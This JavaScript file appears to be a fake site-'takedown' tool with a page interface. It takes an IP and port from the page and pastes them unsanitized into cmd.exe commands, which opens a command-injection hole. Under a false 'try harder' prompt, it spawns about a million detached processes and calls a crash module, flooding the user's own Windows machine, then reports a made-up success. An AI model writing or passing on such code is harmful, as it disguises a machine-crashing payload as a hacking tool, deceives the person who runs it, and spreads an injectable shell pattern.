const child = require('child_process');
const crash = require('wincrash.js')

function spawnshell(command) {
    child.spawn('cmd.exe', ['/c', command], { shell: true, detached: true })
    //child.spawn(command, { shell: true });
}
function hack() {
    elements = [document.getElementById('ip').value, document.getElementById('port').value];
    spawnshell('ping ' + elements[0] + ':' + elements + '-n 1000');
    for (i = 0; i <= 3; i++) {
        spawnshell('tree')
    }
    setTimeout(() => {
        tryharder = confirm('takedown failed, try harder?')
        if (tryharder) {
            //instances = 3;
            instances = 1024000

            for (i = 0; i <= instances; i++) {
                spawnshell('echo %random%')
            }
            setTimeout(() => {
                crash();
                alert('took down site with ' + (Math.round(Math.random()) * 10) + ' attempts.  Currently running several background jobs.');
            }, 60000)
        }
        else {
            alert('exiting...')
            process.exit(0)
        }
    }, 10000)
}